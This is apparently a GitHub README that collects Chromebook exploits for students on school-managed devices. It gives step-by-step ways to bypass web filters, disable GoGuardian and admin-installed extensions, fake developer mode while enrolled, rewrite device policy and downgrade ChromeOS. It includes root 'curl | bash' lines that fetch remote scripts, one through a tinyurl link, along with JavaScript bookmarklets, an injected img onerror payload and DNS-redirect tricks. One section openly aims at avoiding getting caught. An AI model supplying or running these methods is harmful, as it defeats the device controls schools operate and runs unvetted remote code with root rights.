Sign up to <a href="https://github.com/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Inglan2%2FLinuxOnGitpod">The Hub (GitHub)</a>

To use, <a href="https://gitpod.io/?autostart=true#https://github.com/Brandon421-ops/LinuxOnGitpod">click here</a>, continue with the hub, then press continue. Wait...

 then on the bottom right Click open browser.

</details>

<details>
<summary><b>Outlook Exploit</b> Unblocked browser method (outlook)</summary>

### Requirements
- Access to dev tools (inspect)

**Instructions**

This takes a while to get blocked

1. Open outlook

2. Go to the + sign 

3. Press add apps

4. Search up bookings

5. Add the app and open it

6. Right click and press inspect

7. Go to console

8. On console you’ll see error messages

9. Click the blue magnifying on one of the errors

10. A browser will pop up. 

11. Search up whatever

12. All done 🙂

</details>

<details>
<summary><b>TerraOS</b> Linux from RMA shim</summary>

1. Clone the <a href="https://github.com/r58Playz/terraos">TerraOS repository</a>.

Run `git clone https://github.com/r58Playz/terraos.git` in a terminal.

2. Create a build directory in the cloned directory.

3. Run `bash ../scripts/build_stage1.sh <defconfig>` in the terminal.
- Use terraos as the defconfig if building for x86_64 Chromebooks.
- Use `terraos_jacuzzi` as the defconfig if building for `jacuzzi` board Chromebooks.
- Support for `jacuzzi` boards is experimental and may not work.

4. Run bash ../scripts/build_aur_packages.sh in the terminal.

5. Run
`bash ../scripts/build_all.sh <shim.bin> <board_recovery.bin>
<reven_recovery.bin>`
in the terminal, replacing `<shim.bin>` with the path to a shim for your board, `<board_recovery.bin>` with the path to a recovery image for your board, and `<reven_recovery.bin>` with the path to a Chrome OS Flex recovery of the same version. This places a built bootloader image, SquashFS and tarballs of the arch RootFS, a bootloader image with the arch Rootfs, a bootloader image with TerraOS Chrome OS, and a bootloader image with both the arch RootFS and TerraOS Chrome OS in the build directory.

The default arch RootFS user and password are `terraos`.

</details>

<details>
<summary><b>Shimboot</b> Linux from RMA shim</summary>

Shimboot is a collection of scripts for patching a Chrome OS RMA shim to serve as a bootloader for a standard Linux distribution. It allows you to boot a full desktop Debian install on a Chromebook, without needing to unenroll it or modify the firmware.
  
**For more detailed information, please see the project's <a href="https://github.com/ading2210/shimboot">README</a>**

Further reading:
- <a href="https://shimboot.ading.dev/">https://shimboot.ading.dev/</a>
- <a href="https://github.com/ading2210/shimboot">https://github.com/ading2210/shimboot</a>

Credit to <a href="https://ading.dev/">vk6</a> for this exploit

</details>

<details>
<summary><b>Skiovox</b> Unrestricted browsing</summary>

**Patched on chrome versons 120+**

### What is it?

An exploit that allows for browsing within a completely unblocked Chrome
browser. It works on ChromeOS 118 and a wide range of previous versions.
- Skiovox utilizes a bug in kiosk apps
- Very similar to a bug from 3 years ago
Within the unblocked browser, you can
- Install extensions
- Bypass pretty much all blocks
- Do whatever the honk you want

### How to use it

Bypassi made a wonderful slideshow for you goof balls to follow, view using any of the links below!

- <a href="https://www.skiovox.com/">https://www.skiovox.com/</a>
- <a href="https://skiovox.netlify.app">https://skiovox.netlify.app</a>
- <a href="https://drive.google.com/file/d/1tl8eP26MFRejHO38H5HwMLl2VaQrtn0Z/preview">https://drive.google.com/file/d/1tl8eP26MFRejHO38H5HwMLl2VaQrtn0Z/preview</a>
- <a href="https://1drv.ms/b/s!Ais5N3vPLTEMh8poZbywnNWdMUrhUA?e=MaCHBx">https://1drv.ms/b/s!Ais5N3vPLTEMh8poZbywnNWdMUrhUA?e=MaCHBx</a>

</details>

<details>
<summary><b>Skiovox for v120</b> Unrestricted browsing</summary>

**Skiovox Method "120"**

"If you see that you don't have a sign in as existing user button, click Ctrl+Alt+Shift+R then click cancel" then continue.

1. Sign out of your chromebook.

2. Turn off your wifi.

3. Select one of the apps

4. As soon as you click on the app, quickly hit Alt+Shift+S.

5. This should to launch the toolbar; watch for the "No wifi" screen to appear.

6. After you click the settings on the screen brightness settings in the tool bar, nothing should happen (the tool bar will disappear), and that's normal.

7. Press Ctrl+alt+z to open Chrome Vox, then select Resources, then select a link. Now use the exact keybindings to close Chrome Vox.

8. Entering your password and school account, after click "Sign in as existing user." (Same login for school.) If everything went well, you should notice "muti user sign in disabled on this Chromebook" and be logged into your school account in the kiosk app. To bypass simply press the ESC button.

9. You should be able to exit the browser associated with your school account and see a settings option; try turning on wifi first, then close that window. The window unblocked is the last one. You can launch incognito as well.

</details>

<details>
<summary><b>Skiovox for v121</b> Unrestricted browsing</summary>

**Skiovox Method "121"**

1. signout

2. type your password in (dont enter)

3. click esc + shift + alt + r

4. click "cancel" (dont powerwash your chromebook)

5. do the normal skiovox thingy (ex: turning off wifi, going into the kiosk app, and alt + shift + s'ing then finally going to accessibility and question mark)
-- these next steps have to be fast

6. click "add wifi" then spam esc

7. click add other person and spam esc

**Only works if you have your gmail saved into your chromebook like those who have their gmail saved in their chromebook, so like when you sign out, your pfp would be there and you would only need to type your password basically if it shows usernames and photos on the sign-in screen is enabled by admin.**

</details>

<details>
<summary><b>Skiovox breakout</b> permanent code execution</summary>

1. Get into skiovox normally
(install skiovox-helper or skiomox)

2. download the extension at <a href="https://github.com/munyDev/skiovox-breakout/">https://github.com/munyDev/skiovox-breakout/</a> (i use the css branch but you can use main)
(click on code button and press download zip)

3. once you have the extension installed
click on it 

4. this will open a menu
in the first input box type the first 5 letters of the extension ID

5. in the second one either type in custom JS for it to run or for more fun remove everything out of the box

6. click start injection

7. next open a file (ex: *.html) should open a school window

8. open the extension page and press any switch (if there is none open a file such as the background.js)

9. copy the url (filesystem:chrome-extension:ID_HERE/temporary/shim.html) and make it a bookmark

10. reboot and log in normally 

11. right click on the bookmark open in new tab

boom! arbitrary code executor

</details>

<details>
<summary><b>Tr3nch</b> Running scripts in chrome://os-settings with SKIOVOX and Sh0vel</summary>

<a href="https://whelement.github.io/tr3nch.html">Website</a>

<a href="https://whelement.me/tr3nch">GitHub</a>

<a href="https://discord.com/channels/419123358698045453/1237166678685782087">Discord</a>

<a href="https://raw.githubusercontent.com/Whelement/Tr3nch/main/tr3nch.js">Source</a>

</details>

<details>
<summary><b>Fakemurk</b> Trick your Chromebook into being in developer mode while being enrolled in your school's profile</summary>

**Fakemurk is a script that is able to run in developer mode to trick your Chromebook into being in developer mode while being enrolled in your school's profile. You can use this to disable any extension, as well as have full access to the chrome web store and google play store. This basically provides a personal Chromebook-like experience, while still being enrolled.**

Go here and follow instructions: <a href="https://docs.google.com/document/d/1Pku_CbEG9SwQtnm0I188RtpdpW8nXQhiNdMp8PN7Mik/edit?pli=1">Fakemurk Doc</a>

</details>

<details>
<summary><b>Pollen</b> Chrome OS User Policy Editor</summary>

**DEV MODE ONLY**

Normal Use
open crosh

```
run shell
run sudo su
run
curl -Ls https://mercuryworkshop.github.io/Pollen/Pollen.sh | bash
```

then press alt+vol_up+x

to make your own modifactions refer to the Pollen Wiki

<a href="https://github.com/MercuryWorkshop/Pollen/wiki#getting-your-policies">Pollen Modifaction Wiki</a>

</details>

<details>
<summary><b>Customized Pollen</b> Chrome OS Policy Editor Customized</summary>

**Customized Pollen for SH1mmered chrombook users.** 

The original pollen by Mercury Workshop: <a href="https://github.com/MercuryWorkshop/Pollen">Pollen GitHub</a> 

It removes all admin installed extensions and thats kinda a problem for everyone so fruvs (op) edited it to make it fit more for SH1mmer users because fruvs (op) already got caught once cause he got snitched on.

So fruvs (op) customized this one to edit lots of features. But to keep all admin installed extensions so no one get's caught. So fruvs (op) edited some

incognito mode: on (everything unblocked, idk if extensions like GoGauridan can see)

ExtensionSettings: all settings removed

HomepageLocation: chrome://newtab

NewTabPageLocation: (left empty)

ManagedBookmarks: removed all school added bookmarks

PinnedLauncherApps: removed all force pinned apps to home bar

RestoreOnStartupURLs: (set it so when you open a new window some schools forces it to also open the schools homepage so                                                          its set back to new tab and no extra tabs)

WebAppInstallForceList: removed all force installed apps


How to run

Note: Devmode NEEDS to be enabled.
Open Crosh

Run
```
shell
```
Run
```
sudo su
```

Run 
```
curl -Ls https://tinyurl.com/repollen | bash
```

Done! It may take a few seconds for the new policy to apply. If it does not apply, press 
```
alt+vol_up+x
```

Errors

If you have Linux enabled you will have to turn it off and turn it back on for it to work

THIS WILL RESET EVERY TIME YOU RESTART THE CHROMEBOOK SO YOU WILL NEED TO RE DO THE PROCESS

</details>

<details>
<summary><b>Fusion 360 exploit</b> Unblocked browser</summary>

**Some schools have Fusion360 already downloaded and if it isn’t, then download it through the play store. This exploit opens an unblocked browser inside of Fusion.** 

What you do is on the sign-up page, click terms of service. Then there is a YT logo at the bottom. Click it to go to the social media page. Next, click Autodesk under the YouTube text. Using this method, you get unblocked YT! For unblocked google, just look up “google.com link is description”. Go to the description and click google.com. Done! 

The admin can remove apps, so it can still be blocked.

</details>

<details>
<summary><b>Downgrading</b> Change versions</summary>  
Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, sutch as LTBEEF. This is a built in feature of ChromeOS.

![image](https://user-images.githubusercontent.com/58097612/212685863-3d6b8ce1-7caa-4735-95a8-8eb6787b227c.png)

<i>Requirements</i>
1. A USB thumb drive with at least 4gb of storage, some board have small or bigger images, I recommend 16gb
2. A personal computer with access to downloading extentions
3. A brain
If you do not have these, you **CAN NOT** perform the exploit!

<i>Setup</i>
1. Navigate to `chrome://version` on the chromebook you with to downgrade and check for your board under `Platform` (ex I have a c3100 and it's board is stable-channel octopus).

<img src="https://user-images.githubusercontent.com/88395302/212484378-65e6e6e3-b995-48a1-b229-3265a4993279.png">

2. Navigate to https://chrome100.dev/ , press `ctrl+f` and type in your board.
3. Find and download the chrome version you want to your personal computer.

<i>Instlation</i>
1. Install Chromebook Recovery Utility onto your personal computer. (found at <a href="https://chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm?hl=en">chrome.google.com/webstore/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm</a>
2. Open the extention, and click on the settings button in to top right hand corner, and click "use local image".
3. Select the recovery image you downloaded from chrome100.
4. Plug in the USB you wish to use, and follow the prompts on the screen.
5. On your chromebook, press esc+reload+power and follow the prompts.
6. On the checking for updates screen, press `ctrl`+`shift`+`e` to skip the "checking for updates" screen.
7. Profit.

</details>

<details>
<summary><b>KVS (Kernel Version Switcher)</b> Change to any kernel version (unpatch downgrading)</summary>

<a href="https://github.com/Brandon421-ops/KVS">GitHub</a>

<a href="https://brandon421-ops.github.io/KVS/">Website</a>

</details>

<details>
<summary><b>Killcurly</b> Break extensions</summary>
Kill extension, by signing out.

1. Visit `chrome://settings/signOut`, the O in Out must be capital.
2. Press the big blue button
3. Go to `chrome://restart`
4. Now visit <a href="https://tinyurl.com/AddSession">tinyurl.com/AddSession</a> or <a href="https://accounts.google.com/signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession">this link</a>
5. Add your **SCHOOL** account back. It WILL NOT WORK if you add a home account back. This is just so you can still access Google Drive, Youtube, and any Google service.
6. All extensions should stop working.
7. Note that you have to repeat this every time you restart or sign out.
8. If the link gets patched and you no longer see the blue button, go to `chrome://settings/resetProfileSettings` click current settings, it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
And visit `chrome://restart`.

Workaround for `chrome://settings/signOut` and `javascript:opener.chrome.send("TurnOffSync");` if both patched: Just go to `chrome://settings/syncSetup/advanced` and click 
Customize sync and then flip off the Extensions and Apps or just flip off everything exept for bookmarks

**This was discovered by zoroark and Brandon421-ops**

</details>

<details>
<summary><b>Extention Inactivity hack</b> Inactive Extensions</summary>

1. First do the Esc+Refresh+Power

2. ctrl+d then enter

3. will give you some bullcrap about dev mode is blocked press enter then you will go to a newly restarted chromebook

4. next add wifi-

5. then sign into your account

6. Immediately turn wifi off before extensions load

7. go to `chrome://settings/signOut`

8. click turn off sync and personalization and then turn wifi back on go to whatever site that is extension blocked.

1. Workaround for chrome://settings/signOut if patched: If the link gets patched and you no longer see the blue button, go to `chrome://settings/resetProfileSettings` click current settings, it'll open a blank page, on that page run 
```js
javascript:opener.chrome.send("TurnOffSync");
```
2. Workaround for `chrome://settings/signOut` and `javascript:opener.chrome.send("TurnOffSync");` if both patched: Just go to `chrome://settings/syncSetup/advanced` and click 
Customize sync and then flip off the Extensions and Apps or just flip off everything exept for bookmarks

Note: Before you do any of this do it at home so that way you don have to worry about asking for the school wifi password.

</details>

<details>
<summary><b>New Temporarily Unblock Anything</b> Temporarily Unblock Any Website</summary>

**Might Be Patched on 115 And Above**
  
1. Go to the chrome-extension://Paste the blocker id here/manifest.json page.

2. Go to a new tab page and type in the URL Website you want to unblock don´t go into that website yet just leave it inside the URL Box.

3. Go back to chrome-extension://Paste the blocker id here/manifest.json now create a bookmark called E now click more and In the URL Box you put `chrome://kill` now save that bookmark.

4. Create another bookmark called D click more In the URL Box copy and paste  `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`    Into that URL Box and save that bookmark.

5. Go back to chrome-extension://Paste the blocker id here/manifest.json page and now click bookmark B then quickly go back to the new tab page and click enter now quickly spam bookmark D like 2 or more times now there should be a pop up called do you want to close this page click cancel now boom that website is unblocked until you turn off your chromebook or until you exit out of that website then if that happen´s your gonna have to do all the steps again.

  Easier way for step 2: instead of putting the URL in the new tab box go to chrome-extension://Paste the blocker id here/manifest.json page then click Bookmark E then go to a random website then use the javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1)) Bookmarklet then spam Bookmark D two or more times then a pop up should appear quickly click cancel now boom all done.    Name of Bookmarklet > Unblock Website: javascript:open('https://YOUR WEBSITE HERE?'+'i'.repeat(1))

Note: Save chrome-extension://Paste the blocker id here/manifest.json as a bookmark so you don´t have to come back here and type in the URL thing.

IMPORTANT NOTE: if bookmarklets are blocked your screwed

This workaround was found by <a href="https://github.com/Brandon421-ops">Brandon421-ops</a>

</details>

<details>
<summary><b>Old Temporarily Unblock Anything</b> Temporarily Unblock Any Website</summary>

1. Make a bookmark called tab close blocker now click more on the bottom left corner now in that URL BOX put  `javascript:(function () {window.onbeforeunload = function() { return 1; };})()`

2. Go to a newtab page now go into the URL BOX on the top and put https://YOUR WEBSITE HERE do not click enter yet stay in that URL BOX.

3. Do `search`+`esc` now that should open task manager if `search`+`esc` doesn't work then click the three dots on the top right now scroll down until you find more tools click that and now find task manager click it now boom done with step 3.

4. Find your blocker extension and click it now on the bottom right you should see a button called End process click it now quickly click the URL BOX on the newtab page and click enter now quickly spam the bookmark tab close blocker now a pop up should come up it should have to buttons cancel and leave click cancel and boom done.

  IMPORTANT NOTE: if bookmarklets are blocked your screwed also if task manager or the End process button for task manager is blocked your double screwed.

  </details>

<details>
<summary><b>uBlock Origin</b> Run Code On Pages</summary>

if your school allows the ublock origin chrome extension, then running the edpuzzle script (as well as any other bookmarklet) is possible

1. install ublock origin (<a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm">https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm</a>)

2. go to the extension's settings

3. under the settings tab, check the "i am an advanced user" box and click on the cog icon

4. inside the advanced settings (`chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/advanced-settings.html`), scroll down and find `userResourcesLocation` now change `userResourcesLocation` from `unset` to <a href="https://raw.githubusercontent.com/Brandon421-ops/Exploits-And-Hacks/main/ublockExec.js">https://raw.githubusercontent.com/Brandon421-ops/Exploits-And-Hacks/main/ublockExec.js</a>

5. in the My filters tab of the settings (`chrome-extension://cjpalhdlnbpafiamejdnhcphjbkeiagm/dashboard.html#1p-filters.html`), add `*##+js(execute_script.js)` as a filter

6. now you can press `ctrl`+`alt`+`~` to run any js on the current page

7. if you want to run a bookmarklet, just paste in the javascript: url and press ok on the popup

</details>

<details>
<summary><b>uRun</b> Run Code On Pages</summary>

From <a href="https://github.com/Inglan2">Inglan2</a>.

Recently Google cracked down on bookmarklets and now they don't work (Its based on the <a href="https://chromeenterprise.google/policies/?policy=DeveloperToolsAvailability">DeveloperToolsAvailability</a> policy). He wanted to run scripts still so He started making this, inspired by [uBlock Origin *Run Code On Pages*] but with more features, like saving scripts.
1. Open uBlock settings
2. Enable advanced settings, and click the gear ⚙️ button

> [!CAUTION]
> DO NOT MODIFY ANYTHING ELSE ON THIS PAGE, UNLESS YOU KNOW WHAT YOU ARE DOING (you probably don't), AS YOU COULD BREAK SOMETHING.

> [!TIP]
> If you mess up, go to the home of settings and at the bottom click reset to default settings

3. Add the script
> Change
> ```
> userResourcesLocation unset
> ```
> to
> ```
> userResourcesLocation https://inglan2.github.io/uRun/urun.js
> ```

> [!TIP]
> It's down the bottom
4. Set a filter to load uRun
> After closing the advanced settings tab, go to the filters tab and add this:
> ```
> *##+js(urun.js)
> ```

### Usage
Simply press Ctrl + Shift + \` to open the menu and from there you can run and create scripts. To add a script, press the ➕ button up the top right, and enter the code you would like to add (without the `javascript:` part).

</details>

<details>
<summary><b>Snap&Run</b> Run Code On Pages</summary>

**Executing scripts with the "Snap&Read" extension.**

**Extension <a href="https://chromewebstore.google.com/detail/snapread/mloajfnmjckfjbeeofcdaecbelnblden">Snap&Read</a> must be installed to perform this exploit.**

### Setup
The extension needs to be signed in to an active Snap&Read account before you begin.

**Instructions.**

**Enable the Snap&Read toolbar**
- Open the Snap&Read popup by activating the extension.
- In the extension popup, enable the Snap&Read service by toggling the Snap&Read switch on.

1. Open the Snap&Read popup by activating the extension.

2. In the extension popup, enable the Snap&Read service by toggling the Snap&Read switch on.

3. In the Snap&Read toolbar, click the Show outlines  button.

4. In the Snap&Read outlines panel, click the New outline (+) button at the top left.

5. Enter any text into the outline topic's editable text area.

6. Click the bullet point of the topic.

7. Click the Link to source  option.

8. Click the plus (+) button at the bottom right.

9. Click and switch to the WEBSITE tab.

10. In the Article/Page title input field, enter the name of your chosen bookmarklet.

11. In the URL input field, enter the source of the bookmarklet, starting with `javascript:`.

**Important:** You may need to substitute escape characters for advanced bookmarklets.

12. Click SAVE at the top right.

13. Click and switch to the OUTLINE tab.

14. In the Snap&Read toolbar, click the Hide outlines  button.

### Script Execution

**Instructions**

Follow on a page of your choice.

1. In the Snap&Read toolbar, click the Show outlines  button.

2. In your created outline, click the link separated by parenthasis that contains the bookmarklet.

3. In the Snap&Read toolbar, click the Hide outlines  button.

4. Disable the Snap&Read toolbar

5. Open the Snap&Read popup by activating the extension.

6. In the extension popup, disable the Snap&Read service by toggling the Snap&Read switch off.

**Disable the Snap&Read toolbar**
- Open the Snap&Read popup by activating the extension.
- In the extension popup, disable the Snap&Read service by toggling the Snap&Read switch off.

</details>

<details>
<summary><b>Incognito</b> Bypass Extensions</summary>
IP Servers: Server 1. 52.207.185.90
            Server 2. 158.111.114.159

Step 1. Go to your settings

Step 2. Click on the wifi your using rn then click it again.

Step 3.  Scroll down until you see network once you see the option click it.

Step 4. Scroll down until you find custom name servers now once you find the option click it.

Step 5. Paste in the IP Server.

Step 6. Now there should be a notification saying open new tab click that and now you should be in a small window some instructions and there are 2 buttons click the yellow with black letters button and boom Incognito Mode is Unblocked.
One of the buttons are just a link in blue don´t click that one is just for test´s
Step 7. Go back to the network settings and change back the custom name servers to automatic name servers.
Note: If your connection is slow if your school has more than one wifi then connect to the other wifi that might have a better connection.

Btw if you close out of the Incognito Tab your gonna have to do all the steps again.

Cool Advanced Facts About Incognito Mode:
1. Bypass Extensions Aka Unblock All Websites.
2. Your History Is Hidden From Your School

</details>

<details>
<summary><b>Incognito On The Sign-In Screen</b> Bypass Extensions/Unblocked Google Webview</summary>
Might work but idk if it will

IP Servers: Server 1. 52.207.185.90
            Server 2. 158.111.114.159

Step 1. On the sign-in screen go to your wifi settings and click on the wifi your using rn

Step 2. Then Scroll down until you see network once you see the option click it.

Step 3. Scroll down until you find custom name servers now once you find the option click it.

Step 4. Paste in the IP Server.

Step 5. Now on the network settings click the sign in and now you should be in a small window some instructions and there are 2 buttons click the blue link and boom unblocked webview of google.

Cool Advanced Facts About Incognito Mode:
1. Bypass Extensions Aka Unblock All Websites.
2. Your History Is Hidden From Your School

</details>

<details>
<summary><b>Chrome-Signin Webview</b> Bypass Extensions</summary>
Unblocked Google
  
Step 1. Go to `chrome://chrome-signin`

Step 2. Click ok on the bottom right corner

Step 3. In the Email text box put `google@d11.org`

Step 4. Click `signin options`

Step 5. Now click signin with github

Step 6. Click the github logo

Step 7. In the search box on the top Right type google and then click see more topics then you will see all the google links click `www.google.com` now boom unblocked Google.

</details>

<details>
<summary><b>Chrome-Signin Webview 2</b> Bypass Extensions</summary>
Unblocked Google
  
Step 1. Go to `chrome://chrome-signin`

Step 2. Click ok on the bottom right corner

Step 3. In the Email text box put `google@d11.org`

Step 4. Click `signin options`

Step 5. Now click signin with github

Step 6 Click forgot password instead of github logo

Step 7. Click docs

Step 8. Scroll down

Step 9. Click ask the GitHub community

Step 10. Search google and click the hyperlink on the right

Credit to snail for finding this workaround.

</details>

<details>
<summary><b>Microsoft Labs</b> Bypass Extensions</summary>

YOU NEED A MICROSOFT ACCOUNT FOR THIS

Go to: <a href="https://learn.microsoft.com/en-us/training/modules/implement-common-integration-features-finance-ops/10-exercise-1">https://learn.microsoft.com/en-us/training/modules/implement-common-integration-features-finance-ops/10-exercise-1</a>

Next, sign into your Microsoft account, then if it doesn't already, go back to that link

Then, hit Launch VM Mode See images attached if needed

After it loads it's gonna ask for a password, the password is pass@word1 See images attached if needed

Then boom, you are done.

It's still kinda limited, like you can't go on Spotify sound doesn't output anyway and it, blocks random sites, but discord 100% works

Thanks to a user in TN, I was informed the best vpn to get around the FortiNet thing "Greenhub" on the Edge add-ons 

</details>

<details>
<summary><b>Quick View</b> Bypass Extensions</summary>

**QuickView is a universal webview exploit in Chrome OS that utilizes the QuickOffice component extension. This exploit lets you create login windows with arbitrary URLs, thus allowing you to load pages without any extensions.**

Go to <a href="https://quickview-exploit.pages.dev/">this link</a> and follow instructions

WARNING: If `javascript://` is blocked then you can't preform this exploit

Credit to <a href="https://ading.dev/">ading2210</a> and <a href="https://buymeacoffee.com/bypassi">Bypassi#7037</a> for finding this exploit

</details>

<details>
<summary><b>Buypass</b> Temporarily Unblock Websites</summary>

Exploit Made By <a href="https://buymeacoffee.com/bypassi">Bypassi#7037</a>

Here's the original github repo of the buypass exploit: <a href="https://github.com/bypassiwastaken/buypass">Bypassi#7037's Buypass Exploit Github Repo</a>

Here's the original website of the buypass exploit: <a href="https://buypass.bypassi.com/">Bypassi#7037's Buypass Exploit Website</a>

Here's the forked github repo of the buypass exploit: <a href="https://github.com/Brandon421-ops/buypass">Brandon421-ops's Forked Buypass Exploit Github Repo</a>

Here's 4 alternative websites of the buypass exploit:

1. <a href="https://buypass.brandonprather.repl.co/">Buypass Exploit Repl Website</a>

2. <a href="https://buypass.glitch.me/">Buypass Exploit Glitch Website</a>

3. <a href="https://buypass-poc.netlify.app/">Brandon421-ops's Buypass Exploit netlify.app Website</a>

4. <a href="https://buypass.netlify.app/">Bypassi's Buypass Exploit netlify.app Website</a>

This Exploit Is Kinda Similar To The Quick View Exploit

</details>

<details>
<summary><b>[Webview] Testnav Exploit</b> Unblocked Webview for either google or a web browser</summary>

Step 1. Download Testnav off the webstore/playstore/or run as a kiosk app as some schools have it added as one

Step 2. Open it

Step 3. After opened it will probably bring you to the page were you select your consumer, click aimsweb/aimsweb plus

Step 4. After you click goto select your district in the bottom right corner of the page

Step 5. Select “STRATFORD FRIENDS SCHOOL” 

Step 6. Click the arrow to the right of the selection box

Step 7. Click sign in options
a) Click sign in with github

Step  8. Click the github logo at the top of the screen

Step 9. Click the three bars in the top right corner, then goto the search box and type in googleyay

Step 11. Scroll down until you see DerDer56/googleyay

Step 12. There's several links to choose from, but if there's a link you want that's not there click the Bypassi Redirect Tool

(Optional) Step 13. Type in the link you want to go on and click "Go To the URL"

Step 14. Click it and you have webview (unblocked browser)

</details>

<details>
<summary><b>Lego WeView Exploit</b> Unblocked Google Webview</summary>

**Lego WeView exploit is a WebView that <a href="https://github.com/SIMONHSCH">SIMONHSCH</a> discovered in the <a href="https://discord.com/invite/unblock">titanium network</a>.**

Tutorial:

1. First you need to install lego wedo 2 from the <a href="https://play.google.com/store/apps/details?id=com.lego.education.wedo&hl=en_US&gl=US">PlayStore</a> or the <a href="https://chromewebstore.google.com/detail/wedo-20-lego%C2%AE-education/pflionopdgpjckjkafnlamfmonjhccdh">Chrome Webstore</a> (recommended).

2. Click the + button at the left bottom

3. Then click to the pen button at the top

4. And click the green button similar to Google Doc

Then paste this code:
`<img src=# onerror='window.location.href="https://google.com"'>`

</details>

<details>
<summary><b>myviewboard webview</b> Unblocked any website webview</summary>

Here's a webview <a href="https://github.com/S-PScripts">S-PScripts</a> found using myViewBoard Whiteboard.

### Requirements
- Access to the google play store

**Instructions**

1. Go to this link:   <a href="https://play.google.com/store/apps/details?id=com.viewsonic.droid&hl=en&gl=US
">https://play.google.com/store/apps/details?id=com.viewsonic.droid&hl=en&gl=US
</a>

2. Download it. If you can't then you cannot use this exploit.

3. Open the app.

4. Click "Let's sign up!" on the sign up window. It will open a MyViewBoard sign up page.

5. Open a new tab in the app. It will open a different MyViewBoard page but you can ignore this.
--> Extra note: On this MyViewBoard page, you can click the google icon to log in to your personal google account.

6. Put any link in the search box (for example, <a href="https://discord.com/">https://discord.com/</a> - also you will need the https://) and click enter. If there isn't adjust the tab window with the squares in

7. 7. the bottom right. Or alternatively, click the icon between the "-" and the "X".
--> You can also put a term and it will search the term with google too! For example, put discord and it will search discord.

8. Profit!

</details>

<details>
<summary><b>OP Crosh</b> Disable extensions with crosh and vmc</summary>

### Requirements
- A managed Chromebook with crosh enabled
- The `VmManagementCliAllowed` policy either `unset` or `set` to true
- Some form of removable media for noting down extension IDs (only useful for the second method and not required, but this prevents you from mistyping an extension ID).
- A willingness to powerwash

### There are two variations to this method:
1. Disabling all extensions. This is probably the most reliable, but you'd be left without useful extensions such as any adblockers. You also aren't able to install anything from the Chrome Web Store either.

2. Disabling specific extensions. This is less reliable, since this only becomes possible once Chrome OS has installed at least one extension already, which could be one that you're trying to disable.

### Testing if the method is possible:
1. Open crosh by hitting `ctrl`+`alt`+`t`
. If a command line pops up then you have crosh enabled and you can move on to step 2.

2. Test the `VmManagementCliAllowed` policy by running the `vmc` command. If a list of subcommands is shown, then you're good to go.

### Instructions:
1. Back up any data you want before the powerwash.

2. If you're doing the second variation, note down any extension IDs. You may also want to do this if you intend on disabling all extensions, since sometimes that will fail and require you to specify each extension you want to disable.

3. Powerwash by attempting to enable developer mode. Instructions are available <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/developer_mode.md#dev-mode">here</a>.

4. Log into your Google account as normal, but immediately disable your internet right after you sign in.

5. You should be logged into your account, but without any extensions installed due to being offline.

6. Here the instructions are split, so follow the one for the method that you want to do.
 
### Disable All Extensions:
1. Open up crosh by hitting `ctrl`+`alt`+`t`

2. Type in `vmc create-extra-disk --size 1 /home/chronos/user/Extensions`

3. Run that command.

4. If it fails with a "file exists" error, then you must individually specify each extension that you want to remove. Move to step 5 of the next section to do that.

5. Re-enable your internet, and no extensions should be installed.
 

### Disable Specific Extensions:
1. Navigate to `chrome://extensions`.

2. Enable your internet, and immediately disable it when an extension is installed.

3. Assuming the installed extension was not one that you were trying to disable, move on to step 4. If it was, you'd have to powerwash to try again.

4. Open up crosh by hitting `ctrl`+`alt`+`t`.

5. For each extension you want to disable, run this command: `vmc create-extra-disk --size 1 /home/chronos/user/Extensions/{extension_id}`

6. Each command should look something like this: `vmc create-extra-disk --size 1 /home/chronos/user/Extensions/cjpalhdlnbpafiamejdnhcphjbkeiagm`

7. Re-enable your internet, and if you typed/pasted in the extension IDs correctly, those specific extensions should be blocked from ever being installed.

Credit to <a href="https://ading.dev/">ading2210</a> for finding this exploit

</details>

<details>
<summary><b>GoGuardian Fever</b> Disable GoGuardian</summary>

IF YOU DO NOT HAVE GOGUARDIAN THIS EXPLOIT WILL NOT WORK FOR YOU

Getting Started

1. Obviously (but still needs to be said due to skids in Titanium Network), make sure GoGuardian is actually installed

2. Visit any of the links and copy the text in it and paste it in a newtab <a href="https://github.com/Brandon421-ops/Exploits-And-Hacks/blob/main/GoGuardian%20Fever.txt">Link 1</a> <a href="https://raw.githubusercontent.com/Brandon421-ops/Exploits-And-Hacks/main/GoGuardian%20Fever.txt">Link 2</a> <a href="https://pastebin.com/raw/ytcMuigM">Link 3</a>

3. On that tab there will be a simple white screen with nothing on it, reload the page

4. If the GET request fails and you are left on an error screen (don't panic, this is intended, continue)

5. Visit `chrome://restart` to clear cached sites from GoGuardian

Enjoy a free browsing context

To undo

1. On <a href="https://goguardian.com">goguardian.com</a>, press the lock icon at the top left of the screen

2. Press cookies and site data

3. Click manage cookies

4. Then click clear each site's cookies you see there

</details>

<details>
<summary><b>Disable GoGuardian With The Chat</b> Disable GoGuardian [Unreliable]</summary>

1. wait until your teacher opens the chat window thingy

2. spam the x button until it stops re-opening

3. open the url `chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/manifest.json`

4. open `chrome://extensions/?id=haldlgldplgnggkjaafhelgiaglafanh`, and toggle the “allow access to file:// urls” switch

goguardian is now disabled and you can close both tabs 

made by carteeeee

</details>

<details>
<summary><b>Disable GoGuardian With The Browsing Disabled Screen</b> Disable GoGuardian</summary>

bookmark this tab: `chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/lock.html`

1: Have `chrome://extensions` open

2: Ctrl + click on the bookmark to open it (do this about 70+ times)

3: go quickly to `chrome://extensions` and click on GoGuardian.

4: Click on allow access to file urls very quickly!!!

This is discovered by dkr44433.

</details>

<details>
